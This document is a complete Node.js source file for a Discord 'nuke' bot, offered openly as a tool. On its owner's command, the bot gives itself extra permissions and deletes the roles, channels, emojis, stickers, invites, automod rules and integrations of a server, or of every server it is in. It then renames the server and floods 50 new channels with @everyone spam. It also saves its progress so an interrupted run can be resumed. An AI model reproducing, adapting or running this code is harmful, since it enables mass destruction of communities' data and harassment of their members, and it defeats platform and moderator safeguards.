require("dotenv").config();

const fs = require("fs");
const path = require("path");
const {
    Client, GatewayIntentBits, ChannelType, PermissionFlagsBits,
    ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder,
    GuildVerificationLevel, GuildExplicitContentFilter, GuildDefaultMessageNotifications
} = require("discord.js");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers
    ],
    allowedMentions: { parse: ["users", "roles", "everyone"] }
});

// ==================== CONFIG ====================
// Discord user ID of the bot owner; only this user is authorized to run nuke, abort, or recovery commands
const OWNER_ID = "12345678912345679";

// Name of the parent category created to group all newly generated text channels
const CATEGORY_NAME = "Nuked Server";

// Prefix used when creating new channels; channels are named "<CHANNEL_BASE_NAME>-1", "<CHANNEL_BASE_NAME>-2", etc.
const CHANNEL_BASE_NAME = "nuked";

// Total number of text channels to create under the category per target server (Discord guilds cap total channels at 500)
const CHANNEL_COUNT = 50;

// Default number of spam messages sent into each newly created channel (can be overridden per command call, clamped 1-500)
const MESSAGES_PER_CHANNEL = 100;

// Content sent in every spam message; mentions (users, roles, @everyone) are allowed via client allowedMentions
const MESSAGE_TEXT = "This server has been nuked using Berkayprof's nuke bot! https://github.com/berkayprof/nukebot"; 

// Array of guild (server) ID strings to exclude during bulk operations ("nuke all" and resume filtering)
const SKIP_GUILDS = [ /* "123456789012345678", "987654321987654321" */ ];

// Replacement name applied to each target guild (truncated to Discord's 100-character limit)
const NEW_SERVER_NAME = "This server has been nuked!";

// When true, skips deleting integrations belonging to other Discord bots; the bot's own integration is always skipped
const SKIP_OTHER_BOT_INTEGRATIONS = true;

// When true, the bot automatically leaves a guild after finishing its nuke sequence (after a brief delay)
const AUTO_LEAVE = false;

// Maximum number of guilds processed concurrently during a multi-server nuke run
const GUILD_CONCURRENCY = 2;

// Time-to-live (in milliseconds) for a pending "nuke all" confirmation prompt before it expires (currently 5 minutes)
const CONFIRM_TTL_MS = 5 * 60 * 1000;

// File path on disk where run progress is persisted so interrupted multi-guild jobs can be resumed or cleared
const STATE_FILE = path.join(__dirname, "nuke-state.json");

// ==================== LOGGING ====================
const LOG_DIR = path.join(__dirname, "logs");
const LOG_FILE = path.join(LOG_DIR, "nuke.log");
const LOG_MAX_BYTES = 5 * 1024 * 1024;
const LOG_KEEP = 3;

try { fs.mkdirSync(LOG_DIR, { recursive: true }); } catch {}

function rotateLogs() {
    try {
        if (!fs.existsSync(LOG_FILE)) return;
        if (fs.statSync(LOG_FILE).size < LOG_MAX_BYTES) return;
        for (let i = LOG_KEEP - 1; i >= 1; i--) {
            const from = `${LOG_FILE}.${i}`;
            const to = `${LOG_FILE}.${i + 1}`;
            if (fs.existsSync(from)) fs.renameSync(from, to);
        }
        fs.renameSync(LOG_FILE, `${LOG_FILE}.1`);
    } catch {}
}

function log(level, ...parts) {
    const line = `[${new Date().toISOString()}] [${level}] ${parts.join(" ")}`;
    if (level === "ERROR") console.error(line);
    else if (level === "WARN" || level === "429") console.warn(line);
    else console.log(line);
    try {
        rotateLogs();
        fs.appendFileSync(LOG_FILE, line + "\n");
    } catch {}
}

// ==================== STATE ====================
let awaitingConfirm = false;
let confirmExpiresAt = 0;
let pending = null;
let running = false;
let cancelled = false;
let activeState = null;
let ownerUser = null;

function saveState(s) { try { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); } catch (e) { log("WARN", "failed to save state:", e.message); } }
function loadState() { try { return JSON.parse(fs.readFileSync(STATE_FILE, "utf8")); } catch { return null; } }
function clearState() { try { fs.unlinkSync(STATE_FILE); } catch {} }

// ==================== HELPERS ====================
async function pool(items, limit, worker) {
    const queue = [...items];
    let i = 0;
    const runners = Array.from({ length: Math.min(limit, queue.length) }, async () => {
        while (i < queue.length && !cancelled) {
            const item = queue[i++];
            await worker(item);
        }
    });
    await Promise.all(runners);
}

async function step(label, fn) {
    try {
        return await fn();
    } catch (err) {
        const status = err?.status ?? err?.httpStatus;
        throw new Error(`${label}: ${err.message}${status ? ` [${status}]` : ""}`);
    }
}

function isRetryable(err) {
    const status = err?.status ?? err?.httpStatus;
    return status === 429 || (status >= 500 && status < 600);
}

async function withRetry(label, fn, attempts = 3) {
    let last;
    for (let a = 1; a <= attempts; a++) {
        try {
            return await fn();
        } catch (err) {
            last = err;
            if (!isRetryable(err)) {
                log("WARN", `${label}: ${err.message}`);
                throw err;
            }
            const status = err?.status ?? err?.httpStatus;
            if (status === 429) log("429", `${label} — rate limited, attempt ${a}/${attempts}`);
            else log("WARN", `${label} (${a}/${attempts}): ${err.message}`);
            if (a < attempts) await new Promise(r => setTimeout(r, 500 * 2 ** (a - 1)));
        }
    }
    throw last;
}

async function notify(text, extra = {}) {
    for (let a = 0; a < 2; a++) {
        try {
            const user = a === 0 && ownerUser ? ownerUser : await client.users.fetch(OWNER_ID, { force: true });
            ownerUser = user;
            return await user.send({ content: text, ...extra });
        } catch (err) {
            log("WARN", `DM to owner failed (${a + 1}/2): ${err.message}`);
            if (a === 1) return null;
            await new Promise(r => setTimeout(r, 1000));
        }
    }
}

function targetGuilds() {
    const all = [...client.guilds.cache.values()];
    return {
        targets: all.filter(g => !SKIP_GUILDS.includes(g.id)),
        skipped: all.filter(g => SKIP_GUILDS.includes(g.id))
    };
}

function assertPresent(guild, stage) {
    if (!client.guilds.cache.has(guild.id)) {
        throw new Error(`bot disappeared during stage "${stage}"`);
    }
}

// ==================== PRECHECK ====================
const REQUIRED_PERMS = [
    PermissionFlagsBits.ManageRoles,
    PermissionFlagsBits.ManageChannels,
    PermissionFlagsBits.ManageEmojisAndStickers,
    PermissionFlagsBits.ManageGuild
];

const BOT_SELF_PERMS = [
    ...REQUIRED_PERMS,
    PermissionFlagsBits.ViewChannel,
    PermissionFlagsBits.SendMessages,
    PermissionFlagsBits.ReadMessageHistory,
    PermissionFlagsBits.ManageMessages
];

async function hardenBotRole(guild, me) {
    const botRole = me.roles.botRole;
    if (!botRole) return;

    const missing = BOT_SELF_PERMS.filter(p => !botRole.permissions.has(p));
    if (!missing.length) return;

    await step("harden own role", () =>
        botRole.setPermissions([...botRole.permissions.toArray(), ...missing], "Nuke")
    );
    await guild.members.fetchMe({ force: true }).catch(() => {});
    log("INFO", `[${guild.name}] set ${missing.length} permission(s) on own role`);
}

async function precheck(guild) {
    const me = guild.members.me ?? (await guild.members.fetchMe());
    if (!me) return { ok: false, reason: "could not fetch own member", me: null };

    const missing = REQUIRED_PERMS.filter(p => !me.permissions.has(p));
    if (missing.length) return { ok: false, reason: `missing permissions (${missing.length})`, me };

    const roles = await guild.roles.fetch();
    const isOwner = guild.ownerId === client.user.id;
    const highest = me.roles.highest.position;
    const tooHigh = [...roles.values()].filter(r =>
        r.id !== guild.id && !r.managed && !isOwner && r.position >= highest
    );

    return {
        ok: true,
        me,
        roles,
        warnings: tooHigh.length ? [`${tooHigh.length} role(s) are above the bot and will remain`] : []
    };
}

// ==================== NUKE ====================
async function rebuildGuild(guild, messageCount) {
    const stats = { roleFails: 0, chanFails: 0, msgFails: 0 };
    if (cancelled) return stats;

    const check = await precheck(guild);
    if (!check.ok) throw new Error(check.reason);
    for (const w of check.warnings) log("WARN", `[${guild.name}] ${w}`);

    const me = check.me;
    log("INFO", `[${guild.name}] start`);

    // secure own permissions before changing anything else
    await hardenBotRole(guild, me);
    assertPresent(guild, "harden");

    await Promise.allSettled([
        step("verification level", () => guild.setVerificationLevel(GuildVerificationLevel.Highest, "Nuke")),
        step("content filter", () => guild.setExplicitContentFilter(GuildExplicitContentFilter.AllMembers, "Nuke")),
        step("notifications", () => guild.setDefaultMessageNotifications(GuildDefaultMessageNotifications.OnlyMentions, "Nuke")),
        step("afk channel", () => guild.setAFKChannel(null, "Nuke")),
        step("locale", () => guild.setPreferredLocale("en-US"))
    ]);

    await guild.setSystemChannel(null, "Nuke").catch(() => {});
    await guild.setRulesChannel(null, "Nuke").catch(() => {});

    if (cancelled) return stats;

    const invites = await guild.invites.fetch().catch(() => null);
    if (invites?.size) {
        await pool([...invites.values()], 3, i =>
            withRetry(`[${guild.name}] invite`, () => i.delete("Nuke")).catch(() => {})
        );
    }

    const emojis = await guild.emojis.fetch().catch(() => null);
    if (emojis?.size) {
        await pool([...emojis.values()], 3, e =>
            withRetry(`[${guild.name}] emoji ${e.name}`, () => e.delete("Nuke")).catch(() => {})
        );
    }

    const stickers = await guild.stickers.fetch().catch(() => null);
    if (stickers?.size) {
        await pool([...stickers.values()], 3, s =>
            withRetry(`[${guild.name}] sticker ${s.name}`, () => s.delete("Nuke")).catch(() => {})
        );
    }

    if (guild.soundboardSounds) {
        const sounds = await guild.soundboardSounds.fetch().catch(() => null);
        if (sounds?.size) {
            await pool([...sounds.values()], 3, s =>
                withRetry(`[${guild.name}] sound ${s.name}`, () => s.delete("Nuke")).catch(() => {})
            );
        }
    }

    const automod = await guild.autoModerationRules.fetch().catch(() => null);
    if (automod?.size) {
        await pool([...automod.values()], 3, r =>
            withRetry(`[${guild.name}] automod ${r.name}`, () => r.delete("Nuke")).catch(() => {})
        );
    }

    const events = await guild.scheduledEvents.fetch().catch(() => null);
    if (events?.size) {
        await pool([...events.values()], 3, e =>
            withRetry(`[${guild.name}] event ${e.name}`, () => e.delete()).catch(() => {})
        );
    }

    // integrations: NEVER delete own integration, that kicks the bot
    const integrations = await guild.fetchIntegrations().catch(() => null);
    if (integrations?.size) {
        const removable = [...integrations.values()].filter(i =>
            i.applicationId !== client.user.id &&
            !(SKIP_OTHER_BOT_INTEGRATIONS && i.type === "discord")
        );
        if (removable.length) {
            await pool(removable, 3, i =>
                withRetry(`[${guild.name}] integration ${i.name}`, () => i.delete("Nuke")).catch(() => {})
            );
        }
    }

    assertPresent(guild, "integrations");
    if (cancelled) return stats;

    const isGuildOwner = guild.ownerId === client.user.id;
    const myHighest = me.roles.highest.position;

    const deletableRoles = [...check.roles.values()]
        .filter(r => r.id !== guild.id && !r.managed && (isGuildOwner || r.position < myHighest))
        .sort((a, b) => b.position - a.position);

    log("INFO", `[${guild.name}] ${deletableRoles.length}/${check.roles.size} roles deletable`);

    await pool(deletableRoles, 3, role =>
        withRetry(`[${guild.name}] role ${role.name}`, () => role.delete("Nuke")).catch(err => {
            stats.roleFails++;
            log("WARN", `[${guild.name}] role "${role.name}": ${err.message}`);
        })
    );

    assertPresent(guild, "roles");
    if (cancelled) return stats;

    const channels = await step("fetch channels", () => guild.channels.fetch());
    await pool([...channels.values()], 3, c =>
        withRetry(`[${guild.name}] channel ${c.name}`, () => c.delete("Nuke")).catch(err => {
            stats.chanFails++;
            log("WARN", `[${guild.name}] channel "${c.name}": ${err.message}`);
        })
    );

    assertPresent(guild, "channels");
    if (cancelled) return stats;

    await withRetry(`[${guild.name}] name`, () => guild.setName(NEW_SERVER_NAME.slice(0, 100), "Nuke")).catch(() => {});
    await guild.setIcon(null, "Nuke").catch(() => {});
    await guild.setBanner(null, "Nuke").catch(() => {});
    if (guild.vanityURLCode) await guild.setVanityCode(null, "Nuke").catch(() => {});

    const category = await step("create category", () => guild.channels.create({
        name: CATEGORY_NAME,
        type: ChannelType.GuildCategory,
        reason: "Nuke"
    }));

    const created = [];
    await pool([...Array(CHANNEL_COUNT).keys()], 5, async (i) => {
        const ch = await withRetry(`[${guild.name}] create channel`, () => guild.channels.create({
            name: `${CHANNEL_BASE_NAME}-${i + 1}`,
            type: ChannelType.GuildText,
            parent: category.id,
            reason: "Nuke"
        }));
        created.push(ch);
    });

    if (created.length) await guild.setSystemChannel(created[0], "Nuke").catch(() => {});

    if (cancelled || !created.length) return stats;

    const jobs = [];
    for (let m = 0; m < messageCount; m++) for (const ch of created) jobs.push(ch);

    await pool(jobs, 20, ch =>
        withRetry(`[${guild.name}] message`, () =>
            ch.send({ content: MESSAGE_TEXT, allowedMentions: { parse: ["users", "roles", "everyone"] } })
        ).catch(() => { stats.msgFails++; })
    );

    // touch @everyone last
    await guild.roles.everyone.setPermissions([
        PermissionFlagsBits.ViewChannel,
        PermissionFlagsBits.ReadMessageHistory
    ], "Nuke").catch(err => log("WARN", `[${guild.name}] @everyone reset: ${err.message}`));

    log("INFO", `[${guild.name}] done — ${stats.roleFails} role, ${stats.chanFails} channel, ${stats.msgFails} message errors`);
    return stats;
}

async function runOnGuilds(guilds, { messages = MESSAGES_PER_CHANNEL, existingState = null } = {}) {
    if (running) return notify("A nuke is already running.");

    running = true;
    cancelled = false;

    const state = existingState ?? {
        startedAt: Date.now(),
        targets: guilds.map(g => g.id),
        done: [],
        failed: [],
        current: [],
        messages
    };
    activeState = state;
    saveState(state);

    const totals = { roleFails: 0, chanFails: 0, msgFails: 0 };
    let processed = state.done.length;

    await notify(`🔧 Nuke started on ${guilds.length} server(s), ${messages} messages per channel…`);

    await pool(guilds, GUILD_CONCURRENCY, async (guild) => {
        if (state.done.includes(guild.id)) return;

        processed++;
        state.current.push(guild.id);
        saveState(state);
        await notify(`▶️ ${guild.name} (${guild.id}) — ${processed}/${state.targets.length}`);

        try {
            const stats = await rebuildGuild(guild, messages);
            totals.roleFails += stats.roleFails;
            totals.chanFails += stats.chanFails;
            totals.msgFails += stats.msgFails;
            state.done.push(guild.id);

            if (AUTO_LEAVE && client.guilds.cache.has(guild.id)) {
                await new Promise(r => setTimeout(r, 1500));
                await guild.leave().catch(err => log("WARN", `[${guild.name}] leave: ${err.message}`));
            }
        } catch (err) {
            const gone = !client.guilds.cache.has(guild.id);
            log("ERROR", `[${guild.name}] ${gone ? "bot removed from server" : err.message}`);
            state.failed.push({ id: guild.id, error: gone ? "bot removed from server" : err.message });
        }

        state.current = state.current.filter(id => id !== guild.id);
        saveState(state);
    });

    running = false;
    activeState = null;

    const secs = ((Date.now() - state.startedAt) / 1000).toFixed(1);
    let report = `${cancelled ? "⏹️ Cancelled" : "✅ Done"} in ${secs}s — ${state.done.length}/${state.targets.length} succeeded.`;

    if (totals.roleFails || totals.chanFails || totals.msgFails) {
        report += `\n\nErrors: ${totals.roleFails} roles, ${totals.chanFails} channels, ${totals.msgFails} messages.`;
    }
    if (state.failed.length) {
        report += `\n\nFailed:\n${state.failed.map(f => `• ${f.id}: ${f.error}`).join("\n")}`;
    }
    if (cancelled) report += "\n\nState saved — `!nuke resume` will pick up the rest.";

    if (!cancelled) clearState();
    await notify(report);
}

// ==================== CONFIRM ====================
function confirmPayload(targets, skipped) {
    let text = `⚠️ **Nuke all servers** — ${targets.length} server(s):\n`;
    text += targets.map(g => `• ${g.name} (\`${g.id}\`)`).join("\n");
    if (skipped.length) text += `\n\nSkipped (blacklist):\n${skipped.map(g => `• ${g.name} (\`${g.id}\`)`).join("\n")}`;
    text += `\n\nConfirm within ${CONFIRM_TTL_MS / 60000} minutes, or with \`!confirm\`.`;

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId("nuke:confirm").setLabel("Nuke all").setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId("nuke:cancel").setLabel("Cancel").setStyle(ButtonStyle.Secondary)
    );

    return { content: text, components: [row] };
}

async function requestAll(messages) {
    const { targets, skipped } = targetGuilds();
    if (!targets.length) return { error: "No servers to nuke (everything is on the blacklist)." };

    awaitingConfirm = true;
    confirmExpiresAt = Date.now() + CONFIRM_TTL_MS;
    pending = { expiresAt: confirmExpiresAt, targets: targets.map(g => g.id), messages };

    return { payload: confirmPayload(targets, skipped) };
}

async function clearPending() {
    const old = pending;
    awaitingConfirm = false;
    pending = null;
    for (const msg of old?.messages ?? []) await msg?.edit({ components: [] }).catch(() => {});
}

// ==================== HELP ====================
const HELP = [
    "**General**",
    "`!nuke help` — this overview",
    "`!nuke status` — progress of a running job",
    "`!abort` — stops the running nuke",
    "",
    "**Nuking**",
    "`!nuke [count]` — nukes this server (count = messages per channel)",
    "`!nuke all [count]` — nukes all servers except the blacklist",
    "`!confirm` — confirms `!nuke all` (valid for 5 min)",
    "",
    "**Recovery**",
    "`!nuke resume` — resumes an interrupted run",
    "`!nuke force` — ignores a pending run (state is cleared)"
].join("\n");

// ==================== HANDLERS ====================
client.on("interactionCreate", async (interaction) => {
    if (interaction.isButton()) {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "Not for you.", ephemeral: true });

        if (interaction.customId === "nuke:cancel") {
            await clearPending();
            return interaction.update({ content: "❌ Cancelled.", components: [] }).catch(() => {});
        }

        if (interaction.customId === "nuke:confirm") {
            if (!pending) return interaction.reply({ content: "This confirmation has expired.", ephemeral: true });
            if (Date.now() > pending.expiresAt) { await clearPending(); return interaction.reply({ content: "Expired.", ephemeral: true }); }
            if (running) return interaction.reply({ content: "A nuke is already running.", ephemeral: true });

            const { targets, messages } = pending;
            await clearPending();
            await interaction.update({ content: "🔧 Started.", components: [] }).catch(() => {});

            const guilds = targets.map(id => client.guilds.cache.get(id)).filter(Boolean);
            await runOnGuilds(guilds, { messages });
        }
        return;
    }

    if (!interaction.isChatInputCommand() || interaction.commandName !== "nuke") return;
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "Not for you.", ephemeral: true });

    const sub = interaction.options.getSubcommand();
    const messages = interaction.options.getInteger("messages") ?? MESSAGES_PER_CHANNEL;
    const count = Math.min(Math.max(messages, 1), 500);

    if (sub === "status") return interaction.reply({ content: statusText(), ephemeral: true }).catch(() => {});

    if (sub === "abort") {
        if (!running) { awaitingConfirm = false; return interaction.reply({ content: "No nuke is running.", ephemeral: true }); }
        cancelled = true;
        await notify("⏹️ Abort received — current servers will finish, then stop.");
        return interaction.reply({ content: "⏹️ Abort received.", ephemeral: true });
    }

    if (sub === "resume") {
        const st = loadState();
        if (!st) return interaction.reply({ content: "No saved run.", ephemeral: true });
        if (running) return interaction.reply({ content: "A nuke is already running.", ephemeral: true });

        const rest = st.targets.filter(id => !st.done.includes(id) && !SKIP_GUILDS.includes(id))
            .map(id => client.guilds.cache.get(id)).filter(Boolean);
        if (!rest.length) { clearState(); return interaction.reply({ content: "Nothing left to do.", ephemeral: true }); }

        await interaction.reply({ content: `▶️ Resuming: ${rest.length} server(s).`, ephemeral: true });
        return runOnGuilds(rest, { messages: st.messages ?? MESSAGES_PER_CHANNEL, existingState: st });
    }

    if (sub === "force") {
        if (running) return interaction.reply({ content: "A nuke is already running.", ephemeral: true });
        clearState();
        return interaction.reply({ content: "🗑️ State cleared.", ephemeral: true });
    }

    if (sub === "server") {
        if (!interaction.guild) return interaction.reply({ content: "Only in a server.", ephemeral: true });
        if (running) return interaction.reply({ content: "A nuke is already running.", ephemeral: true });
        if (SKIP_GUILDS.includes(interaction.guild.id)) return interaction.reply({ content: "This server is on the blacklist.", ephemeral: true });

        await interaction.reply({ content: `🔧 Nuking ${interaction.guild.name}…`, ephemeral: true });
        return runOnGuilds([interaction.guild], { messages: count });
    }

    if (sub === "all") {
        if (running) return interaction.reply({ content: "A nuke is already running.", ephemeral: true });
        const { error, payload } = await requestAll(count);
        if (error) return interaction.reply({ content: error, ephemeral: true });

        await interaction.reply({ ...payload, ephemeral: true });
        pending.messages.push(await notify(payload.content, { components: payload.components }));
    }
});

function statusText() {
    if (!running) {
        const st = loadState();
        return st
            ? `No active nuke. Interrupted run: ${st.done.length}/${st.targets.length} done. \`!nuke resume\` to resume, \`!nuke force\` to clear.`
            : "No active nuke.";
    }
    const st = activeState;
    const secs = st ? ((Date.now() - st.startedAt) / 1000).toFixed(0) : "?";
    const current = (st?.current ?? []).map(id => client.guilds.cache.get(id)?.name ?? id).join(", ");
    return `🔧 Running ${secs}s — ${st?.done.length ?? 0}/${st?.targets.length ?? 0} done` +
        (current ? `\nNow: ${current}` : "") +
        (cancelled ? "\n⏹️ Abort active." : "");
}

client.on("messageCreate", async (message) => {
    if (!message.author || message.author.bot) return;
    if (message.author.id !== OWNER_ID) return;

    const lower = message.content.trim().toLowerCase();
    const inGuild = !!message.guild;

    if (lower === "!nuke help") return message.reply(HELP).catch(() => {});
    if (lower === "!nuke status") return message.reply(statusText()).catch(() => {});

    if (lower === "!abort") {
        if (!running) { awaitingConfirm = false; return message.reply("No nuke is running.").catch(() => {}); }
        cancelled = true;
        await notify("⏹️ Abort received — current servers will finish, then stop.");
        return message.reply("⏹️ Abort received.").catch(() => {});
    }

    if (lower === "!nuke all") {
        if (running) return message.reply("A nuke is already running.").catch(() => {});
        const { error, payload } = await requestAll(MESSAGES_PER_CHANNEL);
        if (error) return message.reply(error).catch(() => {});

        if (inGuild) pending.messages.push(await message.channel.send(payload).catch(() => null));
        pending.messages.push(await notify(payload.content, { components: payload.components }));
        return;
    }

    if (lower === "!confirm") {
        if (!pending || !awaitingConfirm) return message.reply("Nothing waiting for confirmation.").catch(() => {});
        if (Date.now() > pending.expiresAt) { await clearPending(); return message.reply("Confirmation expired.").catch(() => {}); }
        if (running) return message.reply("A nuke is already running.").catch(() => {});

        const { targets, messages } = pending;
        await clearPending();
        const guilds = targets.map(id => client.guilds.cache.get(id)).filter(Boolean);
        return runOnGuilds(guilds, { messages });
    }

    if (lower === "!nuke resume") {
        const st = loadState();
        if (!st) return message.reply("No saved run.").catch(() => {});
        if (running) return message.reply("A nuke is already running.").catch(() => {});

        const rest = st.targets.filter(id => !st.done.includes(id) && !SKIP_GUILDS.includes(id))
            .map(id => client.guilds.cache.get(id)).filter(Boolean);
        if (!rest.length) { clearState(); return message.reply("Nothing left to do.").catch(() => {}); }

        await message.reply(`▶️ Resuming: ${rest.length} server(s).`).catch(() => {});
        return runOnGuilds(rest, { messages: st.messages ?? MESSAGES_PER_CHANNEL, existingState: st });
    }

    if (lower === "!nuke force") {
        if (running) return message.reply("A nuke is already running.").catch(() => {});
        clearState();
        return message.reply("🗑️ State cleared.").catch(() => {});
    }

    const match = lower.match(/^!nuke(?:\s+(\d+))?$/);
    if (match) {
        if (!inGuild) return message.reply("Use `!nuke` in a server, or `!nuke all` from DM.").catch(() => {});
        if (running) return message.reply("A nuke is already running.").catch(() => {});
        if (SKIP_GUILDS.includes(message.guild.id)) return message.reply("This server is on the blacklist.").catch(() => {});
        if (loadState()) return message.reply("There is still an interrupted run. Use `!nuke resume`, or `!nuke force` to ignore.").catch(() => {});

        const count = Math.min(Math.max(Number(match[1]) || MESSAGES_PER_CHANNEL, 1), 500);
        await message.channel.send(`🔧 Nuking ${message.guild.name}…`).catch(() => {});
        return runOnGuilds([message.guild], { messages: count });
    }
});

// ==================== STARTUP ====================
const COMMANDS = [
    new SlashCommandBuilder().setName("nuke").setDescription("Nuke with this bot across servers")
        .addSubcommand(s => s.setName("server").setDescription("Nuke this server")
            .addIntegerOption(o => o.setName("messages").setDescription("Messages per channel (1-500)").setMinValue(1).setMaxValue(500)))
        .addSubcommand(s => s.setName("all").setDescription("Nuke all servers except the blacklist")
            .addIntegerOption(o => o.setName("messages").setDescription("Messages per channel (1-500)").setMinValue(1).setMaxValue(500)))
        .addSubcommand(s => s.setName("status").setDescription("Show progress"))
        .addSubcommand(s => s.setName("abort").setDescription("Stop the running nuke"))
        .addSubcommand(s => s.setName("resume").setDescription("Resume an interrupted run"))
        .addSubcommand(s => s.setName("force").setDescription("Clear a pending run"))
].map(c => c.toJSON());

const djsVersion = require("discord.js").version;
const STARTUP_EVENT = djsVersion.localeCompare("14.16.0", undefined, { numeric: true }) >= 0 ? "clientReady" : "ready";

let startupHandled = false;
async function onStartup() {
    if (startupHandled) return;
    startupHandled = true;

    log("INFO", `Logged in as ${client.user.tag} — AUTO_LEAVE=${AUTO_LEAVE}`);

    try {
        await client.application.commands.set(COMMANDS);
        log("INFO", "slash commands registered");
    } catch (err) {
        log("ERROR", "failed to register slash commands:", err.message);
    }

    const st = loadState();
    const extra = st ? `\n\n⚠️ Interrupted run: ${st.done.length}/${st.targets.length}. \`!nuke resume\` or \`!nuke force\`.` : "";
    await notify(`✅ Online as ${client.user.tag} — ${client.guilds.cache.size} servers.${extra}`);
}

client.once(STARTUP_EVENT, onStartup);

client.on("error", (err) => log("ERROR", "client:", err.message));
client.on("guildDelete", g => log("WARN", `BOT REMOVED from ${g.name} (${g.id}) — available=${g.available}`));
client.on("guildUnavailable", g => log("WARN", `GUILD UNAVAILABLE ${g.name} (${g.id})`));
client.on("shardDisconnect", (e, id) => log("WARN", `shard ${id} disconnect: ${e?.message ?? e}`));
client.on("shardReconnecting", id => log("WARN", `shard ${id} reconnect`));
client.on("shardResume", (id, n) => log("INFO", `shard ${id} resumed (${n} events)`));

process.on("unhandledRejection", (err) => log("ERROR", "unhandledRejection:", err?.message ?? String(err)));
process.on("uncaughtException", (err) => log("ERROR", "uncaughtException:", err?.message ?? String(err)));

const token = process.env.DISCORD_TOKEN;
if (!token) {
    log("ERROR", "DISCORD_TOKEN is not set in environment or .env file");
    process.exit(1);
}

client.login(token);	
